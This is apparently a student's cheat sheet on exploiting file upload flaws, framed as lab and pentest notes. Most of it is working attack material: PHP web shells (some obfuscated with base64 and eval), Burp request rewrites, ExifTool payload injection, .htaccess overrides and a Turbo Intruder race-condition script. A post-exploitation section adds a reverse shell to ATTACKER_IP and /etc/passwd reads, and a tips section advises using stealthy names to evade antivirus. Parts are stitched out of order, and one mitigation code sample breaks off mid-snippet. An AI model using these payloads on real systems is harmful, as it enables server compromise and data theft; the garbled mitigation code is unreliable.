# ğŸ“¤ File Upload Vulnerability Testing - Complete Notes

## ğŸ¯ Initial Setup & Important Note

**âš ï¸ CRITICAL:** For file upload vulnerability testing, always use the **image filter** in Burp Suite Proxy tab!

```
ğŸ“ Steps to Filter:
ğŸ”¸ Burp Suite â†’ Proxy â†’ HTTP History
ğŸ”¸ Filter bar â†’ Show only: Images/File uploads
ğŸ”¸ This isolates file upload requests for analysis
```

---

## ğŸ“‘ Table of Contents

1. No File Upload Validation
2. Content-Type Restriction Bypass
3. Extension Blacklist Bypass
4. Obfuscated File Extension
5. Malicious Code in Image Metadata
6. Race Condition Attack

---

## 1ï¸âƒ£ No File Upload Validation

### ğŸ“Œ Concept

Website **does NOT validate** uploaded files at all. Any file type can be uploaded and executed, including malicious scripts.

### ğŸ” Why This Works

- No server-side validation
- No file type checking
- No content inspection
- Direct execution of uploaded files

### ğŸ› ï¸ Testing Steps

**Step 1: Upload legitimate file first**

```
ğŸ“¤ Upload: image.jpg or test.png
ğŸ“ Note the storage path
Example: https://target.com/uploads/files/image.jpg
```

**Step 2: Test PHP file upload (if site uses PHP)**

**ğŸ”¸ Script Option 1 - Direct File Content Reading:**

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**ğŸ’¡ Use Case:**

- Read sensitive files directly
- Output captured in Burp Suite response
- Best for: Reading configuration files, secrets, credentials

**ğŸ”¸ Script Option 2 - Command Execution (Web Shell):**

```php
<?php system($_GET['cmd']); ?>
```

**ğŸ’¡ Use Case:**

- Interactive command execution
- Access via URL parameter
- Example: `https://target.com/uploads/shell.php?cmd=whoami`

**ğŸ¯ URL Command Examples:**

```bash
?cmd=whoami           # Check current user
?cmd=ls -la           # List files and directories
?cmd=cat /etc/passwd  # Read passwd file
?cmd=id               # Check user privileges
?cmd=pwd              # Current directory
```

**Step 3: Access and exploit**

```
ğŸ”— Navigate to: https://target.com/uploads/shell.php?cmd=ls
âœ… Result: Commands execute successfully
ğŸ’¥ Full server access achieved!
```

### ğŸ’¡ Key Points

- ğŸš¨ Most dangerous vulnerability
- ğŸ¯ Direct Remote Code Execution (RCE)
- ğŸ”“ No protection at all
- âš¡ Easiest to exploit

---

## 2ï¸âƒ£ Web Shell Upload via Content-Type Restriction Bypass

### ğŸ“Œ Concept

Website validates file type using **Content-Type header** (client-controlled). We can change this header to bypass validation while uploading malicious files.

### ğŸ” Why This Works

- Content-Type is set by client (attacker)
- Server trusts client-provided header
- No actual file content validation
- Only header checking, not file magic bytes

### ğŸ› ï¸ Testing Steps

**Step 1: Upload legitimate file**

```
ğŸ“¤ Upload: test.jpg
âœ… Response: 200 OK - Upload successful
```

**Step 2: Attempt malicious file upload**

```
ğŸ“¤ Upload: shell.php
ğŸš« Response: 403 Forbidden or "Invalid file type"
```

**Step 3: Intercept and modify request**

```
ğŸ”¸ Burp Suite â†’ Proxy â†’ Intercept ON
ğŸ”¸ Upload shell.php again
ğŸ”¸ Request captured â†’ Send to Repeater
```

**Step 4: Change Content-Type header**

```http
Original Request:
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php        â† âŒ Blocked

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

```http
Modified Request:
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg               â† âœ… Allowed

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**Step 5: Forward request**

```
âœ… Hit "Forward" or "Send"
ğŸ“ File uploaded: /uploads/shell.php
ğŸ¯ Access: https://target.com/uploads/shell.php?cmd=whoami
```

### ğŸ’¡ Common Allowed Content-Types

```
âœ… image/jpeg
âœ… image/png
âœ… image/gif
âœ… application/octet-stream
âœ… text/plain
```

### ğŸ’¡ Key Points

- ğŸ”§ Easy to bypass with Burp Suite
- ğŸ­ File content remains unchanged
- ğŸ”‘ Only header is modified
- âš ï¸ Very common vulnerability

---

## 3ï¸âƒ£ Web Shell Upload via Extension Blacklist Bypass

### ğŸ“Œ Concept

Developers blacklist common extensions like `.php` but forget **uncommon extensions** (`.php3`, `.php5`, `.phtml`) or configuration files (`.htaccess`).

### ğŸ” Why This Works

- Blacklist incomplete
- Uncommon extensions execute as PHP
- .htaccess can redefine file execution rules
- Apache/Web server configuration loopholes

### ğŸ› ï¸ Testing Steps

**Step 1: Test for path traversal first**

```
ğŸ“¤ Try uploading: ../../../shell.php
ğŸ”¸ If blocked â†’ Proceed to Step 2
```

**Step 2: Try uncommon PHP extensions**

```
ğŸ”¸ Test these alternatives:
   â€¢ shell.php3
   â€¢ shell.php4
   â€¢ shell.php5
   â€¢ shell.phtml
   â€¢ shell.phar
   â€¢ shell.inc
   â€¢ shell.phps
```

**Example Upload:**

```
ğŸ“¤ Upload: webshell.php5
âœ… Success: File accepted
ğŸ”— Access: https://target.com/uploads/webshell.php5?cmd=id
```

**Step 3: Use .htaccess configuration override**

**ğŸ”¸ Create .htaccess file:**

```apache
AddType application/x-httpd-php .test
```

**ğŸ’¡ What this does:**

- Tells Apache to execute `.test` files as PHP
- Creates custom file type mapping
- Bypasses extension blacklist

**Step 4: Upload chain attack**

```
1ï¸âƒ£ Upload: .htaccess (with above content)
   âœ… File uploaded to: /uploads/.htaccess

2ï¸âƒ£ Create: malicious.test
   Content: <?php system($_GET['cmd']); ?>
   
3ï¸âƒ£ Upload: malicious.test
   âœ… File uploaded to: /uploads/malicious.test

4ï¸âƒ£ Execute: https://target.com/uploads/malicious.test?cmd=whoami
   ğŸ’¥ Commands execute successfully!
```

### ğŸ’¡ Alternative .htaccess Payloads

```apache
# Make any extension executable as PHP
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif

# Or use AddHandler
AddHandler application/x-httpd-php .test
```

### ğŸ’¡ Key Points

- ğŸ”“ Exploits incomplete blacklists
- ğŸ”§ .htaccess is powerful for Apache servers
- ğŸ¯ Multiple bypass techniques available
- âš ï¸ Check web server type (Apache, Nginx, IIS)

---

## 4ï¸âƒ£ Web Shell Upload via Obfuscated File Extension

### ğŸ“Œ Concept

Use **null byte injection** (`%00`) to trick file validation. Everything after `%00` is ignored by the server, but validation sees the allowed extension.

### ğŸ” Why This Works

- Null byte (`%00`) terminates strings in many languages
- Validation sees: `test.php%00.png` â†’ Thinks it's PNG
- Server processes: `test.php` (ignores everything after %00)
- Exploits string handling vulnerabilities

### ğŸ› ï¸ Testing Steps

**Step 1: Upload PHP file normally**

```
ğŸ“¤ Upload: test.php
ğŸš« Blocked: "Invalid file type"
```

**Step 2: Intercept & send to Repeater**

```
ğŸ”¸ Burp Suite â†’ Intercept ON
ğŸ”¸ Upload test.php again
ğŸ”¸ Right-click â†’ Send to Repeater
```

**Step 3: Modify filename with null byte**

```http
Before:
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: application/x-php

After:
Content-Disposition: form-data; name="file"; filename="test.php%00.png"
Content-Type: image/png
```

**Step 4: Send modified request**

```
âœ… Hit "Send"
ğŸ“ File uploaded successfully
ğŸ¯ Server saves as: test.php (null byte truncates extension)
```

**Step 5: Access the uploaded file**

```
ğŸ”¸ Right-click on uploaded image â†’ Inspect Element
ğŸ”¸ Copy image source URL:
   Example: https://target.com/uploads/test.php%00.png

ğŸ”¸ Remove %00.png from URL:
   Access: https://target.com/uploads/test.php

ğŸ”¸ Add command parameter:
   https://target.com/uploads/test.php?cmd=ls

ğŸ’¥ Shell access achieved!
```

### ğŸ’¡ Null Byte Variations

```
ğŸ”¸ test.php%00.jpg
ğŸ”¸ test.php%00.png
ğŸ”¸ test.php%00.gif
ğŸ”¸ test.php%2500.jpg  (double encoded)
ğŸ”¸ test.php\x00.png   (hex format)
```

### ğŸ’¡ Key Points

- ğŸ”‘ Works on older PHP versions (< 5.3.4)
- ğŸ­ Bypasses extension validation
- ğŸ“ URL encoding is crucial (%00)
- âš ï¸ May not work on modern systems

---

## 5ï¸âƒ£ Injecting Malicious Code in PNG/JPEG File to Bypass Security

### ğŸ“Œ Concept

Website checks file **dimensions, headers, footers, and magic bytes** but doesn't sanitize **EXIF metadata**. We inject PHP code into image metadata.

### ğŸ” Why This Works

- File is actually a valid image (passes all checks)
- Metadata fields can contain arbitrary data
- PHP executes code in metadata when file is accessed
- Server processes file as PHP if extension is correct

### ğŸ› ï¸ Testing Steps

**Step 1: Download a legitimate image**

```bash
# Download from internet or use existing
wget https://example.com/cat.jpg
# OR
curl -O https://example.com/image.png
```

**Step 2: Inject malicious code using ExifTool**

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" cat.jpg -o malicious.php
```

**ğŸ”¸ Command Breakdown:**

```bash
exiftool                    # Image metadata tool
-Comment="..."             # Insert code in Comment field
<?php ... ?>               # PHP payload
echo 'START '              # Start marker for output
file_get_contents('...')   # Read target file
' END'                     # End marker for output
cat.jpg                    # Source image file
-o malicious.php           # Output filename
```

**ğŸ¯ Alternative Payloads:**

```bash
# Command execution
exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpg -o shell.php

# File listing
exiftool -Comment="<?php echo shell_exec('ls -la'); ?>" image.jpg -o list.php

# Read database config
exiftool -Comment="<?php echo file_get_contents('config.php'); ?>" image.jpg -o config.php
```

**Step 3: Upload the poisoned image**

```
ğŸ“¤ Upload: malicious.php
ğŸ”¸ If blocked, try: malicious.php%00.jpg (obfuscation)
âœ… File uploaded successfully
```

**Step 4: Execute & extract data**

```
ğŸ”— Navigate to: https://target.com/uploads/malicious.php
ğŸ”¸ View page source (Ctrl+U)
ğŸ” Search for: "START"
ğŸ“„ Secret data appears between START and END markers

Example Output:
<html>
...
START db_password_12345_secret END
...
</html>
```

### ğŸ’¡ Finding Output in Different Ways

```
Method 1: View Page Source
  ğŸ”¸ Right-click â†’ View Page Source
  ğŸ”¸ Ctrl+F â†’ Search "START"

Method 2: Use Burp Suite
  ğŸ”¸ Response tab shows complete output
  ğŸ”¸ Easier to see markers

Method 3: cURL
  curl https://target.com/uploads/malicious.php | grep -o "START.*END"
```

### ğŸ’¡ EXIF Fields to Use

```bash
-Comment="..."          # Most common
-Artist="..."           # Alternative field
-Copyright="..."        # Another option
-ImageDescription="..." # Also works
```

### ğŸ’¡ Key Points

- âœ… Bypasses magic byte validation
- âœ… Valid image file (passes all checks)
- ğŸ¯ Code hidden in metadata
- ğŸ”§ Requires ExifTool installation
- ğŸ“ Use markers (START/END) for easy extraction

---

### ğŸ’¡ Key Points

- âš¡ Timing is everything
- ğŸ¯ Multiple attempts increase success rate
- ğŸ”§ Turbo Intruder is essential
- ğŸ“Š Monitor response differences
- ğŸ”„ May need multiple attack runs

---

## ğŸ›¡ï¸ Prevention Measures

|âŒ Vulnerability|âœ… Fix|
|---|---|
|**No Validation**|Implement strict server-side validation|
|**Content-Type Bypass**|Check magic bytes, not headers|
|**Extension Blacklist**|Use whitelist of allowed extensions only|
|**Null Byte Injection**|Sanitize filenames, reject special characters|
|**Metadata Injection**|Strip all EXIF/metadata before storage|
|**Race Condition**|Validate before moving to accessible directory|

### ğŸ”’ Additional Security Measures

```
âœ… Store files outside web root
âœ… Randomize uploaded filenames
âœ… Set proper file permissions (no execute)
âœ… Use antivirus scanning
âœ… Implement rate limiting
âœ… Separate upload and access domains
âœ… Use Content Security Policy (CSP)
```

---

## ğŸ”§ Essential Tools

### ğŸ¦Š Burp Suite Extensions

- **Turbo Intruder** - Race condition attacks
- **Upload Scanner** - Automated upload testing
- **Content Type Converter** - Header manipulation

### ğŸ“¦ Command Line Tools

```bash
# ExifTool - Metadata manipulation
sudo apt install libimage-exiftool-perl

# File - Check file type
file malicious.php

# Strings - Extract readable text
strings malicious.php

# xxd - Hex dump
xxd malicious.php | head
```

### ğŸŒ Online Resources

- **ExifTool Documentation**
- **File Signature Database** (magic bytes)
- **PHP Extension List**

---

## ğŸ“š Quick Reference Commands

### ExifTool Commands

```bash
# View metadata
exiftool image.jpg

# Inject PHP code
exiftool -Comment="<?php system('whoami'); ?>" image.jpg -o shell.php

# Inject in multiple fields
exiftool -Comment="<?php CODE ?>" -Artist="<?php CODE ?>" image.jpg -o shell.php

# Remove all metadata
exiftool -all= image.jpg
```

### File Type Detection

```bash
# Check file type (magic bytes)
file malicious.php

# View hex dump
hexdump -C malicious.php | head

# Check for PHP code
grep -a "<?php" malicious.php
```

### cURL File Upload

```bash
# Basic upload
curl -F "file=@shell.php" https://target.com/upload

# With custom Content-Type
curl -F "file=@shell.php;type=image/jpeg" https://target.com/upload

# With custom filename
curl -F "file=@shell.php;filename=test.jpg" https://target.com/upload
```

### Access Uploaded Shell

```bash
# Simple command
curl "https://target.com/uploads/shell.php?cmd=whoami"

# Multiple commands
curl "https://target.com/uploads/shell.php?cmd=ls+-la"

# Encode special characters
curl "https://target.com/uploads/shell.php?cmd=cat+/etc/passwd"
```


---

## 6.   Web Shell Upload via Race Condition

### ğŸ¯ Understanding Race Conditions

**Scenario:** 
- Website uploads file temporarily
- Validates/scans the file
- Deletes file if malicious
- Time window: Few milliseconds

**Exploitation:** Access the file during the brief window before deletion

### ğŸ”§ Method 1: Manual Race Condition (Burp Suite)

#### Step-by-Step Process

**Step 1: Upload Malicious File**
```php
// exploit.php
<?php system($_GET['cmd']); ?>
```

**Step 2: Capture Upload Request (POST)**
```http
POST /upload HTTP/1.1
Host: vulnerable-site.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="exploit.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**Step 3: Capture Access Request (GET)**
```http
GET /uploads/exploit.php?cmd=whoami HTTP/1.1
Host: vulnerable-site.com
```
*Initial response: 404 NOT FOUND*

**Step 4: Send to Repeater**
- Send POST request to Repeater
- Send GET request to Repeater

**Step 5: Create Parallel Group**
```
1. Select both requests in Repeater
2. Right-click â†’ "Create tab group"
3. Set to "Send group in parallel"
```

**Step 6: Exploit the Race Condition**
```
1. Send parallel requests repeatedly
2. Monitor responses
3. Success when GET returns 200 OK with command output
4. Keep trying - timing is critical!
```

**Visual Flow:**
```
POST (upload) â”€â”€â”€â”€â”€â”
                   â”œâ”€â†’ Send Parallel â†’ Race Window Hit!
GET (access)  â”€â”€â”€â”€â”€â”˜
```

### ğŸš€ Method 2: Turbo Intruder (Automated)

**Tool:** Burp Suite Extension - Turbo Intruder

#### Python Script for Race Condition

```python
def queueRequests(target, wordlists):
    # Create engine with 10 concurrent connections
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=10,
    )

    # POST request - File upload
    request1 = '''POST /upload HTTP/1.1
Host: vulnerable-site.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: 234

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="exploit.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
'''

    # GET request - Access uploaded file
    request2 = '''GET /uploads/exploit.php?cmd=whoami HTTP/1.1
Host: vulnerable-site.com
'''

    # Queue upload request with gate
    # Gate blocks final byte until openGate is called
    engine.queue(request1, gate='race1')
    
    # Queue multiple access attempts
    for x in range(5):
        engine.queue(request2, gate='race1')

    # Release all requests simultaneously
    engine.openGate('race1')

    # Wait for completion
    engine.complete(timeout=60)


def handleResponse(req, interesting):
    # Display all responses in table
    table.add(req)
```

#### Script Explanation

**Key Components:**

1. **RequestEngine:**
```python
concurrentConnections=10  # Number of parallel connections
```

2. **gate='race1':**
```python
# Holds the final byte of request
# Ensures simultaneous sending
engine.queue(request1, gate='race1')
```

3. **Multiple GET Requests:**
```python
for x in range(5):  # Send 5 GET requests
    engine.queue(request2, gate='race1')
```

4. **openGate:**
```python
engine.openGate('race1')  # Release all requests at once
```

### ğŸ¯ Advanced Race Condition Techniques

#### Technique 1: Burst Mode
```python
# Send 100 requests in rapid succession
for x in range(100):
    engine.queue(request2, gate='race1')
```

#### Technique 2: Staggered Timing
```python
# Upload once, try access multiple times
engine.queue(request1, gate='race1')
for x in range(50):
    engine.queue(request2, gate='race1')
    
engine.openGate('race1')

# Immediately try again
engine.queue(request1, gate='race2')
for x in range(50):
    engine.queue(request2, gate='race2')
    
engine.openGate('race2')
```

#### Technique 3: Continuous Loop
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=20,
    )
    
    # Continuous attack for 30 seconds
    for round in range(10):
        engine.queue(request1, gate=f'race{round}')
        for x in range(10):
            engine.queue(request2, gate=f'race{round}')
        engine.openGate(f'race{round}')
    
    engine.complete(timeout=60)
```

---

## ğŸ•·ï¸ Web Shell Examples

### Basic PHP Web Shells

#### Minimal Shell
```php
<?php system($_GET['cmd']); ?>
```

#### Improved Shell
```php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```

#### Full-Featured Shell
```php
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo "<pre>";
    $result = shell_exec($cmd);
    echo $result;
    echo "</pre>";
}
?>
```

### Obfuscated Shells

#### Base64 Encoded
```php
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>
```

#### Using Alternative Functions
```php
<?php
// Using passthru
passthru($_GET['cmd']);

// Using exec
echo exec($_GET['cmd']);

// Using shell_exec
echo shell_exec($_GET['cmd']);

// Using backticks
echo `{$_GET['cmd']}`;
?>
```


---

## ğŸ§ª Complete Testing Methodology

### Phase 1: Reconnaissance

**1. Identify Upload Functionality**
```
- Profile picture upload
- Document upload
- Avatar upload
- File sharing features
- Import/export functions
```

**2. Analyze Upload Behavior**
```
- Where are files stored?
- Are files renamed?
- What validations exist?
- Client-side or server-side checks?
```

### Phase 2: Validation Testing

**Test Checklist:**

- [ ] **Extension Validation**
  - Try blocked extensions (.php, .asp, .jsp)
  - Try double extensions
  - Try case variations
  - Try null byte injection

- [ ] **Content-Type Validation**
  - Change Content-Type header
  - Test with valid image MIME type
  - Test with application/octet-stream

- [ ] **Magic Bytes Validation**
  - Add valid file headers
  - Create polyglot files
  - Test with exiftool injection

- [ ] **File Size Validation**
  - Test very large files
  - Test empty files
  - Test size manipulation

- [ ] **Filename Validation**
  - Path traversal attempts
  - Special characters
  - Unicode characters
  - Null bytes

### Phase 3: Exploitation

**1. Basic Web Shell**
```bash
# Create simple shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload shell.php
# Access: http://target.com/uploads/shell.php?cmd=whoami
```

**2. Polyglot Image**
```bash
# Create polyglot
cat image.jpg > polyglot.php
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.php

# Upload with .jpg extension
# Access with .php extension if possible
```

**3. Race Condition**
```bash
# Use Turbo Intruder script
# Monitor for successful execution
# Extract data or establish persistence
```

### Phase 4: Post-Exploitation

**After Successful Upload:**

```bash
# 1. Verify execution
?cmd=whoami

# 2. Enumerate system
?cmd=uname -a
?cmd=id
?cmd=pwd

# 3. Find sensitive files
?cmd=ls -la /etc/
?cmd=cat /etc/passwd

# 4. Establish reverse shell
?cmd=bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# 5. Escalate privileges
?cmd=sudo -l
```

---

## ğŸ›¡ï¸ Mitigation Strategies

### For Developers

#### 1. Whitelist Allowed Extensions
```php
// âœ… Good - Whitelist approach
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($ext, $allowed)) {
    die("Invalid file type");
}
```

#### 2. Validate MIME Type (Server-Side)
```php
// âœ… Good - Check actual file type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);

$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];
## ğŸ¯ Testing Methodology Checklist

### Phase 1: Reconnaissance

- [ ] Identify file upload functionality
- [ ] Check accepted file types
- [ ] Note upload directory path
- [ ] Determine web server type (Apache/Nginx/IIS)
- [ ] Check PHP version (if applicable)

### Phase 2: Basic Testing

- [ ] Upload legitimate file (baseline)
- [ ] Try direct PHP upload
- [ ] Test for error messages
- [ ] Note file storage location

### Phase 3: Bypass Techniques

- [ ] Test Content-Type modification
- [ ] Try uncommon extensions (.php3, .php5)
- [ ] Attempt null byte injection (%00)
- [ ] Test .htaccess upload
- [ ] Try path traversal (../)

### Phase 4: Advanced Techniques

- [ ] Inject code in image metadata
- [ ] Test polyglot files (valid image + PHP)
- [ ] Attempt race condition attack
- [ ] Try double extension (shell.php.jpg)

### Phase 5: Verification

- [ ] Access uploaded files
- [ ] Test command execution
- [ ] Document successful techniques
- [ ] Clean up uploaded files

---

## ğŸ’¡ Pro Tips & Best Practices

### ğŸ¯ Reconnaissance Tips

```
1. Check robots.txt for upload directories
2. Look for upload forms in hidden admin panels
3. Test all file upload fields (avatar, documents, attachments)
4. Check for old backup directories (/uploads_old, /files_backup)
```

### ğŸ” Testing Strategy

```
Start Simple â†’ Increase Complexity

1. Direct upload (.php)
2. Content-Type bypass
3. Extension variations
4. Null byte injection
5. Metadata injection
6. Race conditions
```

### ğŸ“ Documentation

```
For each successful bypass, document:
âœ… Vulnerability type
âœ… Payload used
âœ… Steps to reproduce
âœ… Request/response screenshots
âœ… Impact assessment
```

### âš¡ Speed Tips

```
ğŸ”¸ Use Burp Repeater for quick testing
ğŸ”¸ Create payload template library
ğŸ”¸ Save working requests
ğŸ”¸ Automate with Python/Bash scripts
```

---

## ğŸš¨ Common Mistakes to Avoid

### âŒ Don't Do This

```
Ã— Forgetting to URL-encode special characters
Ã— Not checking response carefully (200 vs 404)
Ã— Giving up after first blocked attempt
Ã— Testing only one bypass technique
Ã— Not documenting successful payloads
Ã— Uploading obvious malware (detected by AV)
```

### âœ… Do This Instead

```
âœ“ Always try multiple techniques
âœ“ Read error messages carefully
âœ“ Test with different file types
âœ“ Use stealthy payload names
âœ“ Check both request and response
âœ“ Document everything systematically
```

---

## ğŸ”— Additional Resources

### ğŸ“š Learning Platforms

- **PortSwigger Web Security Academy** - File Upload Labs
- **HackTheBox** - Upload Bypass Challenges
- **TryHackMe** - File Upload Rooms
- **PentesterLab** - Upload Exercises

### ğŸ“– Documentation

- **OWASP File Upload Cheat Sheet**
- **PHP File Upload Security Guide**
- **Apache .htaccess Documentation**
- **ExifTool Official Manual**

### ğŸ¥ Video Tutorials

- IppSec (HackTheBox walkthroughs)
- STÃ–K (Bug bounty techniques)
- Nahamsec (Real-world examples)

---

## âš ï¸ Ethical Reminder

### ğŸš¨ CRITICAL WARNING

**Only test on authorized systems!**

âœ… **Allowed:**

- Personal test environments
- CTF challenges (HackTheBox, PortSwigger, etc.)
- Authorized penetration tests with written permission
- Bug bounty programs (follow scope rules)

âŒ **ILLEGAL:**

- Testing without permission
- Uploading malware to production systems
- Accessing unauthorized data
- Lateral movement after exploitation

### ğŸ“œ Legal Requirements

```
1. Get written authorization
2. Follow rules of engagement
3. Document all activities
4. Report findings responsibly
5. Clean up after testing
```

---

**ğŸ“ Created for Security Testing & Education**  
**ğŸ—“ï¸ Last Updated: 2025**  
**âš–ï¸ Use Responsibly & Ethically**

---

**ğŸ’¬ Happy Ethical Hacking! ğŸ”**  
**ğŸ¯ Master These Techniques, Use Them Wisely! ğŸ›¡ï¸**